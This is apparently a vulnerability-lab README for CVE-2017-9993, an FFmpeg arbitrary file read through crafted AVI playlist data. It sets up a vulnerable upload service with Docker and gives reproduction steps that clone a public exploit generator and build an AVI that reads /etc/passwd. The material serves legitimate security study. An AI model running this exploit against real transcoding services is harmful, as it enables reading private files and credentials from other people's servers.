# FFmpeg AVI Arbitrary File Read (CVE-2017-9993)

[中文版本(Chinese version)](README.zh-cn.md)

FFmpeg is a free and open-source software project consisting of a suite of libraries and programs for handling video, audio, and other multimedia files and streams.

FFmpeg 2.4.x before 2.4.14, 2.8.x before 2.8.12, 3.0.x before 3.0.9, 3.1.x before 3.1.9, 3.2.x before 3.2.6, and 3.3.x before 3.3.2 does not properly restrict HTTP Live Streaming filename extensions and demuxer names, which allows attackers to read arbitrary files via crafted playlist data.

This issue was featured in PHDays conference 2017, and it is actually an incomplete fix for [CVE-2016-1897](../CVE-2016-1897/). FFmpeg officially patched file reading and SSRF vulnerabilities in m3u playlists. However, by crafting malicious AVI files, similar vulnerabilities still exist in the playlist, leading to CVE-2017-9993.

References:

- <https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/>
- <https://github.com/neex/ffmpeg-avi-m3u-xbin>
- <https://www.anquanke.com/post/id/86337>

## Environment Setup

Execute the following commands to build and start the environment:

```
docker compose up -d
```

After the server starts, it will listen on port 8080. Visit `http://your-ip:8080/` to access the application, the application is a simple video player that allows users to upload and play videos.

## Vulnerability Reproduction

First, download the exploit tool and generate a malicious payload:

```bash
# Clone the exploit repository
git clone https://github.com/neex/ffmpeg-avi-m3u-xbin
cd ffmpeg-avi-m3u-xbin

# Generate payload
./gen_xbin_avi.py file:///etc/passwd exp.avi
```

Upload the generated `exp.avi` file at `http://your-ip:8080/`. The backend will attempt to transcode your uploaded video using FFmpeg. During this process, due to the arbitrary file read vulnerability, the file content will be embedded in the transcoded video:

![](1.png)

You can also execute `docker compose exec web bash` to enter the environment and test FFmpeg directly.
